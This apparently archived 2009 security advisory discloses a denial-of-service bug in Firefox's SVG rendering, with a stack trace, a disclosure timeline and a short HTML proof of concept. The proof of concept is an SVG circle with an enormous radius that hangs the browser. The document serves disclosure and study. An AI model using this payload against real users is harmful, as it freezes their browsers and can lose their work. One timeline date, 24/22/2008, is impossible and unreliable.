@@ -1,0 +1,100 @@
+                           From the low-hanging-fruit-department 
+     Firefox et al. Denial of Service - All versions supporting SVG
+________________________________________________________________________
+
+CHEAP Plug :
+************************************************************************
+You are invited to participate in HACK.LU 2009, a small but concentrated
+luxemburgish security conference. More information : http://www.hack.lu
+CFP is open, sponsorship is still possible and warmly welcomed!
+************************************************************************
+
+Release mode: Forced release.
+Ref         : [TZO-26-2009] - Firefox DoS (unclamped loop) SVG
+WWW         : http://blog.zoller.lu/2009/04/advisory-firefox-dos-condition.html
+Vendor      : http://www.firefox.com
+Status      : No patch
+CVE         : none provided
+Credit      : none 
+Bugzilla entry: https://bugzilla.mozilla.org/show_bug.cgi?id=465615
+
+Security notification reaction rating : There wasn't any reaction. OSS Security notification FTW
+Notification to patch window : x+n
+
+Disclosure Policy : http://blog.zoller.lu/2008/09/notification-and-disclosure-policy.html
+
+Affected products : 
+- Firefox all supporting SVG (didn't care to investigate which, task of the vendor)
+- all software packages using mozilla engine and allowing SVG
+
+I. Background
+~~~~~~~~~~~~
+Firefox is a popular internet browser.
+
+II. Description
+~~~~~~~~~~~~~~
+This bug is a typical result of what we call unclamped loop. An "attacker"
+will give the Radius value of the Circle attribute a very big value. That
+is leetness. 
+
+Stack trace : 
+ntkrnlpa.exe+0x6e9ab
+ntkrnlpa.exe!MmIsDriverVerifying+0xbb0
+hal.dll+0x2ef2
+xul.dll!NS_InvokeByIndex_P+0x30c36
+xul.dll!NS_InvokeByIndex_P+0x30e8a
+xul.dll!NS_InvokeByIndex_P+0x30e02
+xul.dll!NS_InvokeByIndex_P+0x30f5e
+xul.dll!XRE_InitEmbedding+0x7858
+xul.dll!XRE_InitEmbedding+0xf4ee
+xul.dll!XRE_TermEmbedding+0x11411
+xul.dll!gfxTextRun::Draw+0xdd4d
+xul.dll!gfxTextRun::Draw+0xe1ca
+xul.dll!gfxWindowsPlatform::PrefChangedCallback+0x1495
+xul.dll!gfxTextRun::SetSpaceGlyph+0x2678
+xul.dll!gfxFont::NotifyLineBreaksChanged+0xf1d3
+xul.dll!gfxWindowsPlatform::RunLoader+0xa9f6
+xul.dll!NS_StringCopy_P+0x9942
+xul.dll!gfxImageSurface::gfxImageSurface+0x3188
+xul.dll!gfxImageSurface::gfxImageSurface+0x2ed8
+
+
+Also produces exceptions in MOZCRT19...
+MOZCRT19!modf+0x2570:
+600715e0 660f122550450960 movlpd  xmm4,qword ptr [MOZCRT19!exception::`vftable'+0x1a3d8 (60094550)] ds:0023:60094550=3fe62e42fefa39ef
+
+III. Impact
+~~~~~~~~~~
+Browser doesn't respond any longer to any user input, all tabs are no 
+longer accessible, your work if any  (hail to the web 2.0) might be lost.
+
+IV. Proof of concept (hold your breath)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<html xmlns='http://www.w3.org/1999/xhtml'>
+<head>
+</head>
+<body>
+<svg xmlns='http://www.w3.org/2000/svg'><circle cx='10' cy='10' r='1.79769313486231E+308' fill='red' /></svg>
+</body></html>
+
+IV. Disclosure timeline
+~~~~~~~~~~~~~~~~~~~~~~~~
+DD/MM/YYYY
+18/11/2008 : Created bugzilla entry (security) with proof of concept, 
+             description the terms under which ooperate and the planned disclosure date.
+
+24/22/2008 : Daniel Veditz comments : "Might be a cairo bug rather than SVG 
+             (seems to be looping in libthebes), but I can definitely confirm 
+                         the DoS.
+                          
+14/12/2008 : Ask for any action plan and my assessement of considering it low risk
+
+             No reply.
+
+28/12/2008 : "Timeless" comments [..] personally, i intend to open this bug 
+             to the public [..] a bug like this is more likely to be fixed 
+                         by being visible to more people than by leaving it in a closet.
+                         
+26/05/2009 : In 2009 I agree; release of this advisory. 
+
+# milw0rm.com [2009-05-26]
